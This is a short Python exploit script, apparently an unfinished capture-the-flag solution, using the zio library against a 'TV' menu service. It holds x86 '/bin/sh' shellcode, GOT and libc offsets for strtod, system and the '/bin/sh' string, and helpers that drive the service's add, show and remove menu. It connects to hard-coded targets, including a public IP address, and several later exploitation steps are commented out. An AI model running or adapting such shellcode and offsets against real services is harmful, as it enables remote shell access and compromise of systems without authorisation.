#!/usr/bin/env python
#encoding:utf-8

import zio
from time import sleep

def NOPS(n):
    return 'B' * n

def LEFT_PAD(s, n):
    return NOPS(n - len(s)) + s

def RIGHT_PAD(s, n):
    return s + NOPS(n - len(s))

DELAY = 1
JMP06 = '\xeb\x06'
SHELLCODE = "j\x0bX\x991\xc9Rh//shh/bin\x89\xe3\xcd\x80"

def RAW_WITH_DELAY(s):
    sleep(DELAY)
    return str(s)

def NONE_WITH_DELAY(s):
    sleep(DELAY)
    return ''

TARGET = ('119.254.101.197', 10003)
GOT_STRTOD = 0x601ca8
LIBC_PRINTF = 0x54400
LIBC_SYSTEM = 0x46640
LIBC_BINSH = 0x17CCDB

TARGET = ('10.211.55.32', 8888)


def show():
    global io
    io.writeline('4')

def add_tv(name, season=0, rating=0, intro='A'):
    global io
    io.writelines(['1', name, str(season), str(rating), intro])

def remove(name):
    global io
    io.writelines(['3', name])


io = zio.zio(TARGET)

add_tv('A')
add_tv('B')
add_tv('A')
add_tv('B')
io.interact()
# remove('A')

# io.read_until_timeout()
# show()
# io.read_until('TV <')
# remove(io.read_until('> season')[:-len('> season')])

# raw_input()

